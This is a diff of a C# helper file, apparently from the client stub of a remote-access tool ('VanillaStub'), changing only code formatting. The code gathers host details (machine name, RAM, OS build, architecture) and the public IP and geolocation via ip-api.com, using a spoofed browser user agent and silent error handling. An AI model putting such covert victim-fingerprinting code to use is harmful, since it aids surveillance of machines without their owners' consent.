@@ -1,11 +1,11 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
 using System.IO;
 using System.Management;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization.Json;
 using System.Text;
+using Microsoft.Win32;
 
 namespace VanillaStub.Helpers.Information
 {
@@ -90,9 +90,7 @@ namespace VanillaStub.Helpers.Information
                 Name = RemoveLastChars(Name);
                 return !string.IsNullOrEmpty(Name) ? Name : "N/A";
             }
-            catch
-            {
-            }
+            catch { }
 
             return "N/A";
         }
@@ -108,7 +106,7 @@ namespace VanillaStub.Helpers.Information
                     foreach (ManagementObject MO in MOS.Get())
                     {
                         double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
-                        RamAmount = (int)(Bytes / 1048576);
+                        RamAmount = (int) (Bytes / 1048576);
                         break;
                     }
                 }
@@ -126,11 +124,11 @@ namespace VanillaStub.Helpers.Information
             try
             {
                 DataContractJsonSerializer JS = new DataContractJsonSerializer(typeof(GeoInfo));
-                HttpWebRequest Request = (HttpWebRequest)WebRequest.Create("http://ip-api.com/json/");
+                HttpWebRequest Request = (HttpWebRequest) WebRequest.Create("http://ip-api.com/json/");
                 Request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
                 Request.Proxy = null;
                 Request.Timeout = 10000;
-                using (HttpWebResponse Response = (HttpWebResponse)Request.GetResponse())
+                using (HttpWebResponse Response = (HttpWebResponse) Request.GetResponse())
                 {
                     using (Stream DS = Response.GetResponseStream())
                     {
@@ -139,15 +137,13 @@ namespace VanillaStub.Helpers.Information
                             string ResponseString = Reader.ReadToEnd();
                             using (MemoryStream MS = new MemoryStream(Encoding.UTF8.GetBytes(ResponseString)))
                             {
-                                GeoInfo = (GeoInfo)JS.ReadObject(MS);
+                                GeoInfo = (GeoInfo) JS.ReadObject(MS);
                             }
                         }
                     }
                 }
             }
-            catch
-            {
-            }
+            catch { }
 
             GeoInfo.Ip = string.IsNullOrEmpty(GeoInfo.Ip) ? "N/A" : GeoInfo.Ip;
             GeoInfo.Country = string.IsNullOrEmpty(GeoInfo.Country) ? "N/A" : GeoInfo.Country;
@@ -187,6 +183,7 @@ namespace VanillaStub.Helpers.Information
                         return true;
                 }
             }
+
             // The environment must be an x86 environment.
             return false;
         }
@@ -196,11 +193,11 @@ namespace VanillaStub.Helpers.Information
             try
             {
                 RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key);
-                return registryKey?.GetValue(value).ToString() ?? String.Empty;
+                return registryKey?.GetValue(value).ToString() ?? string.Empty;
             }
             catch
             {
-                return String.Empty;
+                return string.Empty;
             }
         }
 
@@ -215,15 +212,14 @@ namespace VanillaStub.Helpers.Information
             {
                 osArchitecture = "32/64-bit (Undetermined)";
             }
+
             string productName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
             string csdVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
             string currentBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
             if (!string.IsNullOrEmpty(productName))
-            {
                 return
-                    $"{productName}{(!string.IsNullOrEmpty(csdVersion) ? " " + csdVersion : String.Empty)} {osArchitecture} (OS Build {currentBuild})";
-            }
-            return String.Empty;
+                    $"{productName}{(!string.IsNullOrEmpty(csdVersion) ? " " + csdVersion : string.Empty)} {osArchitecture} (OS Build {currentBuild})";
+            return string.Empty;
         }
     }
 }
